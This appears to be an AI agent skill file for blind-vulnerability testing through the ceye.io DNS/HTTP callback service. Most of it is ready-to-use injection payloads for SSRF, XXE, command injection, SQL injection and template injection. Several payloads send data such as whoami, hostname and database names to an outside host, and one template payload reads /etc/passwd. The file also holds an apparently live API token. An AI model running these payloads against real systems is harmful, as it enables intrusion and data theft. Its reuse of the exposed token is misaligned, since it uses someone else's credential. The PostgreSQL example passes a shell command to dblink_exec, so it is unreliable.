---
name: ceye-dnslog
description: "DNSLog out-of-band detection — use ceye.io DNS/HTTP callback service to detect blind vulnerabilities like SSRF, XXE, command injection, and SQL injection. Trigger when: blind/out-of-band vulnerability testing, no visible output from injections, SSRF/XXE/command injection/SQL injection detection."
---

# DNSLog / Reverse Connection Detection Skill (ceye.io)

## Overview

DNSLog (also called reverse/OOB detection) is a technique for detecting **blind vulnerabilities** that do not return visible output. The core idea: generate a unique subdomain under `ek9k64.ceye.io`, inject it into the target, then check whether the DNS/HTTP callback was received via the ceye.io API.

## Credentials

| Field | Value |
|-------|-------|
| Identifier | `ek9k64` |
| Domain | `*.ek9k64.ceye.io` |
| API Token | `701bba7e6735843777212d526edf5f1f` |
| DNS API | `http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=dns` |
| HTTP API | `http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=http` |

## Workflow

### Step 1: Obtain a Unique Identifier

Generate a unique subdomain per test to correlate callbacks with injection points:

```bash
# Generate a unique subdomain (timestamp + random)
echo "$(date +%s)$(head -c4 /dev/urandom | xxd -p).ek9k64.ceye.io"
```

### Step 2: Inject the Payload into the Target

Use the generated subdomain (represented as `PAYLOAD.ek9k64.ceye.io` below) in the following injection patterns:

#### Blind SSRF / HTTP Request
```
# Via URL parameter
http://target.com/api?url=http://PAYLOAD.ek9k64.ceye.io

# Via request body (XML/JSON)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://PAYLOAD.ek9k64.ceye.io/test">]>
<data>&xxe;</data>

# Via HTTP headers
X-Forwarded-For: PAYLOAD.ek9k64.ceye.io
Referer: http://PAYLOAD.ek9k64.ceye.io
```

#### Blind Command Injection
```bash
# Linux / Unix
; ping -c 3 PAYLOAD.ek9k64.ceye.io
| nslookup PAYLOAD.ek9k64.ceye.io
`curl http://PAYLOAD.ek9k64.ceye.io/$(whoami)`
$(wget http://PAYLOAD.ek9k64.ceye.io/$(hostname))

# Windows
& ping -n 3 PAYLOAD.ek9k64.ceye.io
| nslookup PAYLOAD.ek9k64.ceye.io %USERNAME%.PAYLOAD.ek9k64.ceye.io
```

#### Blind SQL Injection (MySQL / PostgreSQL / MSSQL / Oracle)
```sql
-- MySQL (Windows, requires file privilege)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.PAYLOAD.ek9k64.ceye.io\\a'));

-- PostgreSQL
CREATE OR REPLACE FUNCTION dnslog() RETURNS VOID AS $$
DECLARE cmd TEXT;
BEGIN
  cmd := E'ping -c 1 '||(SELECT current_database())||E'.PAYLOAD.ek9k64.ceye.io';
  PERFORM dblink_exec(cmd);
END;
$$ LANGUAGE plpgsql;

-- MSSQL
DECLARE @host VARCHAR(800);
SELECT @host = DB_NAME()+'.PAYLOAD.ek9k64.ceye.io';
EXEC('master..xp_dirtree "\\'+@host+'\c$"');

-- Oracle (UTL_HTTP / UTL_INADDR)
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT SYS.DATABASE_NAME FROM DUAL)||'.PAYLOAD.ek9k64.ceye.io') FROM DUAL;
```

#### SSTI (Server-Side Template Injection)
```
# Jinja2 / Twig
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('curl http://PAYLOAD.ek9k64.ceye.io/$(whoami)').read() }}

# Java FreeMarker
${"freemarker.template.utility.Execute"?new()("nslookup PAYLOAD.ek9k64.ceye.io")}

# PHP Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup PAYLOAD.ek9k64.ceye.io")}}
```

### Step 3: Poll for Callbacks

```bash
# Poll DNS records
curl -s "http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=dns&filter="

# Poll HTTP records
curl -s "http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=http&filter="
```

### Step 4: Interpret Results

- **DNS query received** → target executed the injected command / resolved the domain. Confirms the vulnerability exists.
- **Subdomain contains data** (e.g., `whoami.PAYLOAD.ek9k64.ceye.io`) → you've also exfiltrated information.
- **HTTP request received** → target supports outbound HTTP (useful for SSRF chaining).
- **No callback** → try different injection points, protocols, or encoding. Some environments block DNS/HTTP outbound.

## Tips

1. **Always use unique subdomains per test** to correlate callbacks with specific injection points.
2. **Prefer DNS over HTTP** — DNS is harder to block and often permitted even in restricted networks.
3. **Encode special characters** in subdomains: `$(whoami)` becomes `$(whoami)` in the URL but the payload itself remains raw when injected.
4. **Use the ping utility as a fallback** when `curl`/`wget` are unavailable — ICMP can also be monitored on some platforms.
5. **Rate limits apply** — most free services have API rate limits. Space out your polls by at least 30 seconds.
6. **For authenticated targets**, the callback will come from the server's IP, not yours — this is expected behavior.
